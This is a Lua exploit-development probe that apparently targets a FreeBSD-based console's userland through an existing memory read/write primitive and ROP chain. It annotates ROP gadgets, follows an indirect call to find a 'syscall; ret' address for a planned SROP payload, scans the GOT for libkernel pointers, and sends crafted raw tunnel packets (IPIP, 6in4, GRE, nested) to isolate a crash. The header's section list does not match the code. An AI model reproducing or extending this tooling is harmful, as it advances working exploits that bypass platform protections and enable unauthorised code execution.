-- CRASH_CLASS: LOW (read-only analysis of dispatch internals)
-- PROBE 107a: Find the ACTUAL syscall instruction address via chain analysis
--
-- Context:
--   The ROP chain uses `call [rax+8]` as its indirect function call mechanism.
--   RAX is loaded from a data slot that contains a pointer to a function table.
--   Following this pointer chain reveals the actual kernel entry point address.
--
--   From probe 41v GOT dump:
--     chain+0x180: pop rax → loads function_table_addr
--     chain+0x1B0: mov r9, r13; call [rax + 8] → calls *(table+8)
--
--   If the target is in libkernel (XO): calculate syscall offset from FreeBSD ABI
--   If the target is in eboot (RX): read the actual bytes to find syscall;ret
--
--   This is THE MISSING PIECE for SROP (probe 106a): without a syscall
--   instruction address, SROP can control registers but can't make syscalls.
--
-- Section A: Follow the chain's indirect call to find syscall function address
-- Section B: Analyze the target function (eboot=read bytes, libkernel=offset math)
-- Section C: Build SROP payload with real syscall address + verify with getpid
-- Section D: 50d crash isolation — binary search for the operation that kills loader

local TEST_SECTION = TEST_SECTION or "A"

print("=== PROBE 107a: SYSCALL ADDRESS FINDER + 50D ISOLATION ===")
print("Section: " .. TEST_SECTION)
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end

-- Get module bases
local sc593 = make_syscall(593)
local sc20 = make_syscall(20)
local sc624 = make_syscall(624)

local ok_pid, pid = pcall(function() return sc20() end)
local our_pid = ok_pid and to_num(pid) or 0
print("PID: " .. our_pid)

local info = memory.alloc(0x200)
safe_wd(info, 0x160)
pcall(function() sc593(uint64(0), info) end)
local eboot_lo = safe_rd(info + 0x108) or 0
local eboot_hi = safe_rd(info + 0x10C) or 0
local eboot_base = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo))
local eboot_sz_lo = safe_rd(info + 0x110) or 0
local eboot_sz_hi = safe_rd(info + 0x114) or 0
print("eboot: " .. fmt(eboot_base) .. " sz=0x" .. string.format("%X%08X", eboot_sz_hi, eboot_sz_lo))

safe_wd(info, 0x160)
pcall(function() sc593(uint64(1), info) end)
local lk_lo = safe_rd(info + 0x108) or 0
local lk_hi = safe_rd(info + 0x10C) or 0
local libkernel_base = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
local lk_sz_lo = safe_rd(info + 0x110) or 0
local lk_sz_hi = safe_rd(info + 0x114) or 0
print("libkernel: " .. fmt(libkernel_base) .. " sz=0x" .. string.format("%X%08X", lk_sz_hi, lk_sz_lo))

-- Get chain addresses
local pipe_str = tostring(syscall.pipe)
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local rop_addr = rop_str and uint64(rop_str) or uint64(0)
local fn_addr = fn_str and uint64(fn_str) or uint64(0)
print("chain: " .. (rop_str or "nil"))
print("fn_addr: " .. (fn_str or "nil"))
print("")

if TEST_SECTION == "A" then
    print("--- Section A: Follow indirect call chain to syscall address ---")
    print("")

    -- From 41v analysis, the chain structure at relevant offsets:
    -- chain+0x180: pop rax; ret → loads function_table_ptr
    -- chain+0x190: pop r13; pop r14; pop r15; ret → pops args
    -- chain+0x1B0: mov r9, r13; call [rax + 8] → indirect call

    -- First: dump the entire chain annotated
    print("[A1] Annotated chain dump (key entries):")
    local chain = rop_addr
    local key_offsets = {
        0x000, 0x008, 0x010, 0x018, 0x020, 0x028,  -- first entries
        0x0F0, 0x0F8, 0x100, 0x108, 0x110,          -- mid chain
        0x178, 0x180, 0x188, 0x190, 0x198, 0x1A0,   -- pre-call
        0x1A8, 0x1B0, 0x1B8, 0x1C0, 0x1C8, 0x1D0,   -- call area
        0x1D8, 0x1E0, 0x1E8, 0x1F0, 0x1F8, 0x200,   -- post-call
        0x208, 0x210, 0x218, 0x220, 0x228, 0x230,
        0x238, 0x240, 0x248, 0x250, 0x258, 0x260,
        0x268, 0x270, 0x278, 0x280, 0x288, 0x290,   -- longjmp area
    }
    for _, off in ipairs(key_offsets) do
        local v = safe_rq(chain + uint64(off))
        if v then
            local h, l = get_hi_lo(v)
            local label = ""
            -- Check if in eboot text
            if h == eboot_hi then
                local eoff = l - eboot_lo
                label = string.format(" [eboot+0x%X", eoff)
                -- Read bytes at target to identify gadget
                local b0 = safe_rb(v)
                local b1 = safe_rb(v + uint64(1))
                local b2 = safe_rb(v + uint64(2))
                if b0 then
                    label = label .. string.format(" =%02X%02X%02X", b0, b1 or 0, b2 or 0)
                    if b0 == 0xC3 then label = label .. " ret"
                    elseif b0 == 0x58 then label = label .. " pop rax"
                    elseif b0 == 0x5F then label = label .. " pop rdi"
                    elseif b0 == 0x0F and b1 == 0x05 then label = label .. " SYSCALL!"
                    elseif b0 == 0xFF then label = label .. " call/jmp"
                    elseif b0 == 0x4C and b1 == 0x89 then label = label .. " mov r*"
                    elseif b0 == 0x48 and b1 == 0x8B then label = label .. " mov rax"
                    elseif b0 == 0x48 and b1 == 0x89 then label = label .. " mov [*]"
                    elseif b0 == 0x41 then label = label .. " REX.B"
                    end
                end
                label = label .. "]"
            elseif h == lk_hi then
                local loff = l - lk_lo
                label = string.format(" [LIBKERNEL+0x%X]", loff)
            end
            print(string.format("  +0x%03X: %s%s", off, fmt(v), label))
        end
    end
    print("")

    -- Find the function_table_ptr loaded before the call [rax+8]
    -- Pattern: chain+0x180 has pop rax; ret → next qword is the table ptr
    -- chain+0x188 has the actual table pointer
    print("[A2] Finding indirect call target:")
    local table_ptr = safe_rq(chain + uint64(0x188))
    if table_ptr then
        print("  Function table ptr: " .. fmt(table_ptr))
        -- Read table[0] and table[8]
        local table_0 = safe_rq(table_ptr)
        local table_8 = safe_rq(table_ptr + uint64(8))
        local table_16 = safe_rq(table_ptr + uint64(16))
        print("  table[0]:  " .. (table_0 and fmt(table_0) or "nil"))
        print("  table[8]:  " .. (table_8 and fmt(table_8) or "nil") .. " ← THIS IS THE CALL TARGET")
        print("  table[16]: " .. (table_16 and fmt(table_16) or "nil"))

        if table_8 then
            local th, tl = get_hi_lo(table_8)
            if th == eboot_hi then
                print("  TARGET IS IN EBOOT (RX — we can read it!)")
                local eoff = tl - eboot_lo
                print("  eboot offset: 0x" .. string.format("%X", eoff))
                -- Read 32 bytes of the target function
                print("  First 32 bytes:")
                local hex = "  "
                for i = 0, 31 do
                    local b = safe_rb(table_8 + uint64(i))
                    hex = hex .. string.format("%02X ", b or 0)
                    if (i + 1) % 16 == 0 then
                        print(hex)
                        hex = "  "
                    end
                end
                if #hex > 2 then print(hex) end
                -- Check for syscall instruction
                for i = 0, 127 do
                    local b = safe_rb(table_8 + uint64(i))
                    if b == 0x0F then
                        local b2 = safe_rb(table_8 + uint64(i + 1))
                        if b2 == 0x05 then
                            local b3 = safe_rb(table_8 + uint64(i + 2))
                            print(string.format("  *** SYSCALL at target+0x%X (next: 0x%02X) ***",
                                i, b3 or 0))
                            if b3 == 0xC3 then
                                print("  *** SYSCALL;RET FOUND! Address: " ..
                                    fmt(table_8 + uint64(i)) .. " ***")
                            end
                        end
                    end
                end
            elseif th == lk_hi then
                local loff = tl - lk_lo
                print("  TARGET IS IN LIBKERNEL (XO — can't read, but know offset)")
                print("  libkernel offset: 0x" .. string.format("%X", loff))
                print("  Standard FreeBSD syscall stub layout:")
                print("    +0: mov $N, %eax")
                print("    +5: mov %rcx, %r10")
                print("    +8: syscall")
                print("    +10: jb error")
                print("    +12: ret")
                print("  Calculated syscall addr: " ..
                    fmt(table_8 + uint64(8)))
                print("  Calculated ret after jb: " ..
                    fmt(table_8 + uint64(12)))
            else
                print("  TARGET IN UNKNOWN REGION: h=0x" .. string.format("%X", th))
            end
        end
    else
        print("  Could not read table ptr at chain+0x188")
    end
    print("")

    -- Also check: does the chain itself have different indirect call locations?
    -- Scan entire chain for `call [rax+8]` pattern
    print("[A3] Scan chain for all indirect call targets:")
    for off = 0, 0x2F0 - 8, 8 do
        local v = safe_rq(chain + uint64(off))
        if v then
            local h, l = get_hi_lo(v)
            if h == eboot_hi then
                -- Read bytes at this eboot address
                local b0 = safe_rb(v)
                local b1 = safe_rb(v + uint64(1))
                local b2 = safe_rb(v + uint64(2))
                local b3 = safe_rb(v + uint64(3))
                -- call [rax+8] = FF 50 08
                if b0 == 0xFF and b1 == 0x50 and b2 == 0x08 then
                    print(string.format("  chain+0x%03X: call [rax+8] at %s", off, fmt(v)))
                -- jmp [rax+8] = FF 60 08
                elseif b0 == 0xFF and b1 == 0x60 and b2 == 0x08 then
                    print(string.format("  chain+0x%03X: jmp [rax+8] at %s", off, fmt(v)))
                -- call rax = FF D0
                elseif b0 == 0xFF and b1 == 0xD0 then
                    print(string.format("  chain+0x%03X: call rax at %s", off, fmt(v)))
                -- jmp rax = FF E0
                elseif b0 == 0xFF and b1 == 0xE0 then
                    print(string.format("  chain+0x%03X: jmp rax at %s", off, fmt(v)))
                -- syscall = 0F 05
                elseif b0 == 0x0F and b1 == 0x05 then
                    print(string.format("  chain+0x%03X: SYSCALL at %s", off, fmt(v)))
                end
            end
        end
    end
    print("")

    -- Stability
    print("[A4] Stability:")
    local ok5, rv5 = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok5 and fmt(rv5) or "FAIL"))

    print("")
    print("[DONE] Section A complete")

elseif TEST_SECTION == "B" then
    print("--- Section B: Deep analysis of __call dispatch function ---")
    print("")

    -- The __call metamethod address can be found from the CClosure
    -- From 56g: __call addr at 0x311035AA0 (per-connection ASLR)
    -- We need to find it for this connection

    -- Get __call address from the pipe object's metatable
    -- The pipe object has a metatable with __call
    local mt = getmetatable(syscall.pipe)
    if mt then
        print("[B1] Pipe metatable contents:")
        for k, v in pairs(mt) do
            print(string.format("  %s = %s (%s)", tostring(k), tostring(v), type(v)))
            if type(v) == "function" then
                -- For C functions, tostring gives a stable address
                local fstr = tostring(v)
                print("    tostring: " .. fstr)
            end
        end
        print("")

        -- The __call function is the dispatch entry point
        local call_fn = mt.__call or mt["__call"]
        if call_fn then
            print("[B2] __call function analysis:")
            print("  type: " .. type(call_fn))
            print("  tostring: " .. tostring(call_fn))

            -- For Lua C functions, we can get the C function pointer
            -- via the CClosure's +0x20 offset (from probe 56c/56f research)
            -- Read it by finding the CClosure in the heap
        end
    else
        print("[B1] No metatable on syscall.pipe")
    end
    print("")

    -- Alternative: read argument slot pointers from the chain
    -- The chain loads arg pointers via pop rax; mov rax,[rax]; ret
    -- These point to the argument data area
    print("[B3] Argument data area scan:")
    -- From 41v: arg slot source addresses are at chain entries like +0x010, +0x058, etc.
    -- These are heap addresses that contain the actual syscall arguments
    -- chain+0x100: first arg pointer read
    -- chain+0x110: pop rdi; ret → sets RDI from next slot
    local chain = rop_addr

    -- Find all data pointers (non-eboot, non-zero heap addresses)
    local data_ptrs = {}
    for off = 0, 0x2F0 - 8, 8 do
        local v = safe_rq(chain + uint64(off))
        if v then
            local h, l = get_hi_lo(v)
            -- Data addresses are in the heap range (0x3xxxxxxxxx)
            if h >= 0x3 and h <= 0x4 then
                table.insert(data_ptrs, {off = off, addr = v})
            end
        end
    end
    print("  Found " .. #data_ptrs .. " data pointers in chain:")
    for _, dp in ipairs(data_ptrs) do
        local val = safe_rq(dp.addr)
        local val_h, val_l = 0, 0
        if val then val_h, val_l = get_hi_lo(val) end
        local label = ""
        if val then
            if val_h == eboot_hi then
                label = " → eboot code"
            elseif val_h == lk_hi then
                label = " → LIBKERNEL code"
            elseif val_h >= 3 and val_h <= 4 then
                label = " → heap data"
            end
        end
        print(string.format("  chain+0x%03X → %s: [%s]%s",
            dp.off, fmt(dp.addr),
            val and fmt(val) or "nil", label))
    end
    print("")

    -- Look specifically at the data slots that might contain
    -- the syscall wrapper function pointer
    print("[B4] Function table scan:")
    for _, dp in ipairs(data_ptrs) do
        local val = safe_rq(dp.addr)
        if val then
            local vh, vl = get_hi_lo(val)
            -- If this data slot points to another heap address (double indirection)
            if vh >= 3 and vh <= 4 then
                -- Read the value at the pointed-to address
                local inner = safe_rq(val)
                local inner_8 = safe_rq(val + uint64(8))
                if inner then
                    local ih, il = get_hi_lo(inner)
                    local i8h, i8l = 0, 0
                    if inner_8 then i8h, i8l = get_hi_lo(inner_8) end
                    local label8 = ""
                    if i8h == eboot_hi then label8 = " EBOOT"
                    elseif i8h == lk_hi then label8 = " LIBKERNEL"
                    end
                    if label8 ~= "" or (ih == eboot_hi or ih == lk_hi) then
                        print(string.format("  chain+0x%03X → %s → [0]=%s [8]=%s%s",
                            dp.off, fmt(dp.addr), fmt(inner),
                            inner_8 and fmt(inner_8) or "nil", label8))
                    end
                end
            end
        end
    end
    print("")

    -- Stability
    print("[B5] Stability:")
    local ok5, rv5 = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok5 and fmt(rv5) or "FAIL"))

    print("")
    print("[DONE] Section B complete")

elseif TEST_SECTION == "C" then
    print("--- Section C: Module PLT/GOT import table scan ---")
    print("  Find resolved function pointers into libkernel")
    print("")

    -- Scan eboot's data section for pointers into libkernel text
    -- eboot data starts after text section
    local eboot_data_lo = safe_rd(info + 0x128) or 0
    local eboot_data_hi = safe_rd(info + 0x12C) or 0

    -- Actually, use dynlib_get_info to get proper data segment info
    safe_wd(info, 0x160)
    pcall(function() sc593(uint64(0), info) end)

    -- Read data segment info from the info struct
    -- Standard offset: +0x128 for data base, +0x130 for data size
    local data_base_lo = safe_rd(info + 0x128) or 0
    local data_base_hi = safe_rd(info + 0x12C) or 0
    local data_sz_lo = safe_rd(info + 0x130) or 0
    local data_sz_hi = safe_rd(info + 0x134) or 0
    local data_base = uint64(string.format("0x%X%08X", data_base_hi, data_base_lo))
    print("eboot data: " .. fmt(data_base) .. " sz=0x" ..
        string.format("%X%08X", data_sz_hi, data_sz_lo))
    print("")

    -- Scan eboot data section for libkernel pointers
    print("[C1] Scanning eboot data for libkernel pointers:")
    local lk_ptrs = {}
    local scan_limit = math.min(data_sz_lo, 0x100000)  -- max 1MB
    if scan_limit < 0x100 then scan_limit = 0x100000 end

    for off = 0, scan_limit - 8, 8 do
        local v = safe_rq(data_base + uint64(off))
        if v then
            local vh, vl = get_hi_lo(v)
            if vh == lk_hi and vl >= lk_lo and vl < lk_lo + 0x48000 then
                local lk_off = vl - lk_lo
                table.insert(lk_ptrs, {data_off = off, lk_off = lk_off, addr = v})
                if #lk_ptrs <= 30 then
                    print(string.format("  data+0x%X: libkernel+0x%X (%s)",
                        off, lk_off, fmt(v)))
                end
            end
        end
        if off % 0x20000 == 0 and off > 0 then
            print(string.format("  ... scanned 0x%X bytes, %d hits", off, #lk_ptrs))
        end
    end
    print("  Total libkernel pointers found: " .. #lk_ptrs)
    print("")

    if #lk_ptrs > 0 then
        print("[C2] Libkernel offset analysis:")
        print("  Looking for offsets consistent with syscall stubs:")
        print("  (Standard FreeBSD: stubs at 0x100-byte intervals)")
        for i, ptr in ipairs(lk_ptrs) do
            if i > 50 then break end
            -- Standard syscall stubs are aligned and at regular intervals
            local align = ptr.lk_off % 0x10
            print(string.format("  libkernel+0x%04X (align=%d)",
                ptr.lk_off, align))
        end
        print("")

        -- Group by alignment to find patterns
        print("[C3] Offset patterns:")
        local aligned = {}
        for _, ptr in ipairs(lk_ptrs) do
            local bucket = math.floor(ptr.lk_off / 0x100) * 0x100
            aligned[bucket] = (aligned[bucket] or 0) + 1
        end
        for bucket, count in pairs(aligned) do
            if count > 0 then
                print(string.format("  0x%04X range: %d entries", bucket, count))
            end
        end
    end
    print("")

    -- Stability
    print("[C4] Stability:")
    local ok5, rv5 = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok5 and fmt(rv5) or "FAIL"))

    print("")
    print("[DONE] Section C complete")

elseif TEST_SECTION == "D" then
    print("--- Section D: 50d Persistent Crash Isolation ---")
    print("  Binary search: which operation in 50d kills the loader?")
    print("  50d = cross-protocol tunneling (IPv6-in-IPv4, IPIP, GRE)")
    print("  50d persistently crashes the PARENT loader process")
    print("")

    -- The key operations in 50d:
    -- 1. Create raw socket (proto=255)
    -- 2. setsockopt IP_HDRINCL
    -- 3. Various tunnel packet constructions
    -- 4. sendto() with crafted packets
    --
    -- Test each component in isolation

    local sc97 = make_syscall(97)    -- socket
    local sc105 = make_syscall(105)  -- setsockopt
    local sc133 = make_syscall(133)  -- sendto
    local sc6 = make_syscall(6)      -- close

    -- Step 1: Just create raw socket with proto=255 (should be safe)
    print("[D1] Create raw socket proto=255:")
    local ok_s, fd_s = pcall(function()
        return sc97(uint64(2), uint64(3), uint64(255))
    end)
    local rfd = ok_s and to_num(fd_s) or -1
    print("  socket(AF_INET, SOCK_RAW, 255): fd=" .. rfd)
    if rfd < 0 then
        print("  Raw socket failed — skip remaining tests")
    else
        -- Step 2: setsockopt IP_HDRINCL
        print("[D2] setsockopt IP_HDRINCL:")
        local opt = memory.alloc(4)
        safe_wd(opt, 1)
        local ok_so, rv_so = pcall(function()
            return sc105(uint64(rfd), uint64(0), uint64(2),
                uint64(opt), uint64(4))
        end)
        print("  IP_HDRINCL: ret=" .. (ok_so and fmt(rv_so) or "FAIL"))
        print("")

        -- Step 3: Send the simplest possible tunnel packet
        -- IPv4 header with proto=41 (6in4) pointing to loopback
        print("[D3] Minimal tunnel packet (proto=41 IPv6-in-IPv4):")
        local pkt = memory.alloc(256)
        -- Outer IPv4: 127.0.0.1 → 127.0.0.1, proto=41
        safe_rb(pkt)  -- touch to ensure mapped
        for i = 0, 63 do safe_wd(pkt + i * 4, 0) end
        -- IPv4 header (20 bytes)
        memory.write_byte(pkt, 0x45)         -- ver=4, ihl=5
        memory.write_byte(pkt + 2, 0)        -- total_len high
        memory.write_byte(pkt + 3, 60)       -- total_len = 60 (20 outer + 40 inner)
        memory.write_byte(pkt + 8, 64)       -- TTL
        memory.write_byte(pkt + 9, 41)       -- proto = 41 (IPv6-in-IPv4)
        memory.write_byte(pkt + 12, 127)     -- src
        memory.write_byte(pkt + 15, 1)
        memory.write_byte(pkt + 16, 127)     -- dst
        memory.write_byte(pkt + 19, 1)
        -- Inner IPv6 header (40 bytes, minimal)
        memory.write_byte(pkt + 20, 0x60)    -- version=6
        memory.write_byte(pkt + 24, 59)      -- next_hdr = No Next Header
        memory.write_byte(pkt + 25, 64)      -- hop_limit
        -- src = ::1
        memory.write_byte(pkt + 35, 1)
        -- dst = ::1
        memory.write_byte(pkt + 55, 1)

        local dest = memory.alloc(16)
        memory.write_byte(dest, 16)           -- len
        memory.write_byte(dest + 1, 2)        -- AF_INET
        memory.write_byte(dest + 4, 127)      -- 127.0.0.1
        memory.write_byte(dest + 7, 1)

        local ok_tx, rv_tx = pcall(function()
            return sc133(uint64(rfd), uint64(pkt), uint64(60),
                uint64(0), uint64(dest), uint64(16))
        end)
        print("  sendto(6in4): ret=" .. (ok_tx and fmt(rv_tx) or "FAIL"))
        print("")

        -- Step 4: Proto=4 (IPIP tunneling)
        print("[D4] IPIP tunnel (proto=4):")
        memory.write_byte(pkt + 9, 4)        -- proto = 4 (IPIP)
        memory.write_byte(pkt + 3, 40)       -- total_len = 40 (20+20)
        -- Inner IPv4 header
        memory.write_byte(pkt + 20, 0x45)    -- ver=4, ihl=5
        memory.write_byte(pkt + 23, 20)      -- inner total = 20 (header only)
        memory.write_byte(pkt + 28, 64)      -- TTL
        memory.write_byte(pkt + 29, 0)       -- proto = 0 (HOPOPT)
        memory.write_byte(pkt + 32, 127)     -- inner src
        memory.write_byte(pkt + 35, 1)
        memory.write_byte(pkt + 36, 127)     -- inner dst
        memory.write_byte(pkt + 39, 1)

        local ok_tx2, rv_tx2 = pcall(function()
            return sc133(uint64(rfd), uint64(pkt), uint64(40),
                uint64(0), uint64(dest), uint64(16))
        end)
        print("  sendto(IPIP): ret=" .. (ok_tx2 and fmt(rv_tx2) or "FAIL"))
        print("")

        -- Step 5: Proto=47 (GRE)
        print("[D5] GRE tunnel (proto=47):")
        memory.write_byte(pkt + 9, 47)       -- proto = 47 (GRE)
        memory.write_byte(pkt + 3, 28)       -- total_len = 28 (20+4+4 GRE minimal)
        -- GRE header (4 bytes minimum)
        safe_wd(pkt + 20, 0)                 -- flags=0, proto=0x0800 (IPv4)
        memory.write_byte(pkt + 22, 0x08)
        memory.write_byte(pkt + 23, 0x00)

        local ok_tx3, rv_tx3 = pcall(function()
            return sc133(uint64(rfd), uint64(pkt), uint64(28),
                uint64(0), uint64(dest), uint64(16))
        end)
        print("  sendto(GRE): ret=" .. (ok_tx3 and fmt(rv_tx3) or "FAIL"))
        print("")

        -- Step 6: Nested tunnel (tunnel-in-tunnel)
        print("[D6] Nested tunnel (6in4-in-IPIP, 3 layers):")
        memory.write_byte(pkt + 9, 4)        -- outer proto = IPIP
        memory.write_byte(pkt + 3, 80)       -- total = 80 (20+20+40)
        -- Middle IPv4 header (proto=41)
        memory.write_byte(pkt + 20, 0x45)
        memory.write_byte(pkt + 23, 60)
        memory.write_byte(pkt + 28, 63)      -- TTL -1
        memory.write_byte(pkt + 29, 41)      -- proto=41 (inner is IPv6)
        memory.write_byte(pkt + 32, 127)
        memory.write_byte(pkt + 35, 1)
        memory.write_byte(pkt + 36, 127)
        memory.write_byte(pkt + 39, 1)
        -- Inner IPv6 header
        memory.write_byte(pkt + 40, 0x60)
        memory.write_byte(pkt + 44, 59)
        memory.write_byte(pkt + 45, 64)
        memory.write_byte(pkt + 55, 1)
        memory.write_byte(pkt + 75, 1)

        local ok_tx4, rv_tx4 = pcall(function()
            return sc133(uint64(rfd), uint64(pkt), uint64(80),
                uint64(0), uint64(dest), uint64(16))
        end)
        print("  sendto(nested): ret=" .. (ok_tx4 and fmt(rv_tx4) or "FAIL"))
        print("")

        -- Close socket
        pcall(function() sc6(uint64(rfd)) end)
    end

    -- Stability
    print("[D7] Stability:")
    local ok5, rv5 = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok5 and fmt(rv5) or "FAIL"))

    print("")
    print("[DONE] Section D complete")
    print("  If any step above causes persistent crash:")
    print("  Run sections D3-D6 individually to isolate the exact packet type")
end

print("")
print("=== PROBE 107a COMPLETE ===")
